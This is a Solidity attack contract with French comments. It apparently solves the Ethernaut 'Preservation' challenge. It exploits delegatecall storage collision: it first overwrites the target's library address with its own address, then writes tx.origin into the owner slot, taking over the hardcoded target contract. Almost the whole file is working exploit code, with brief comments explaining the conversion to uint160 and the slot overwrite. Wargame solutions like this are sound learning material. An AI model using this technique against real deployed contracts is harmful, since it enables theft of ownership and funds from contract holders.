// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

interface Preservation {
    function setFirstTime(uint256 _timeStamp) external;
}

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    function setFirstTime() external {
        address preservationAddress = 0x11DEE84557c589aa73CFFCb92d73809ad0e689b3;
        Preservation preservationContract = Preservation(preservationAddress);
        // pour convertir une adresse en uint256, il faut d'abord
        // la convertir en uint160 (car une addresse est sur 20 octets)
        preservationContract.setFirstTime(uint256(uint160(address(this))));
    }

    // réplique la signature de la fonction setTime de LibraryContract
    // mais modifie le slot 2
    function setTime(uint256 _timeStamp) public {
        owner = tx.origin;
    }
}
